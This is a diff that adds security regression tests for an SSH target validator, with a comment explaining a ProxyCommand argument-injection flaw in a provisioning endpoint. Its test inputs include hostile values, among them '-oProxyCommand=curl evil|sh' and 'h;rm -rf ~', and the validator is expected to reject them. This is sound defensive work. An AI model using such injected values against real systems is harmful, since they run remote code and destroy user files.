@@ -10,6 +10,8 @@ import { join } from "node:path";
 import { mintPairing, logInvocation, readInvocationLog, buildInstaller, startHost } from "../scripts/outpost-host.mjs";
 // @ts-ignore — pure .mjs; typed at call sites
 import { resolveOutpostDispatch, outpostRunFn } from "../fittings/seed/kanban-loop/lib/outpost-dispatch.mjs";
+// @ts-ignore — pure .mjs; the UI server is guarded by an entry check so importing is side-effect-free
+import { isValidSshTarget } from "../fittings/seed/outpost-tailscale-host/scripts/server.mjs";
 
 interface LogRow { at: string; verb: string; outpost: string; caller: string; ok: boolean; ms: number; error?: string }
 
@@ -211,5 +213,34 @@ describe("outpost-host HTTP (ephemeral daemon)", () => {
     expect(data.ok).toBe(true);
     expect(data.entries).toHaveLength(3);
     expect(data.entries[2].ms).toBe(3);
+  });
+});
+
+// GARRISON-UNIFY-V1 S9 security regression: the SSH provisioning target
+// (user@host) is placed as an argv token after ssh's own -o flags. spawn()
+// uses no shell, so shell metacharacters can't execute - but a value beginning
+// with "-" is parsed by ssh's getopt as an option, and `-oProxyCommand=<cmd>`
+// runs <cmd> locally. The endpoint is loopback-bound but unauthenticated (a
+// drive-by cross-site POST can reach it), so handleProvision validates strictly
+// before ssh ever sees the value.
+describe("SSH target validation (S9 provisioning RCE guard)", () => {
+  it("accepts legitimate usernames and hostnames/IPs/MagicDNS/IPv6", () => {
+    expect(isValidSshTarget("ggomes", "mac.local")).toBe(true);
+    expect(isValidSshTarget("ubuntu", "100.88.165.46")).toBe(true);
+    expect(isValidSshTarget("_svc", "box.tailnet.ts.net")).toBe(true);
+    expect(isValidSshTarget("dev", "fd7a:115c::1")).toBe(true);
+  });
+
+  it("rejects dash-leading values (ssh option / ProxyCommand injection)", () => {
+    expect(isValidSshTarget("-oProxyCommand=curl evil|sh", "x")).toBe(false);
+    expect(isValidSshTarget("root", "-oProxyCommand=touch /tmp/pwned")).toBe(false);
+  });
+
+  it("rejects whitespace and shell metacharacters, and empty values", () => {
+    expect(isValidSshTarget("a b", "host")).toBe(false);
+    expect(isValidSshTarget("root;touch x", "host")).toBe(false);
+    expect(isValidSshTarget("user", "h;rm -rf ~")).toBe(false);
+    expect(isValidSshTarget("", "host")).toBe(false);
+    expect(isValidSshTarget("user", "")).toBe(false);
   });
 });
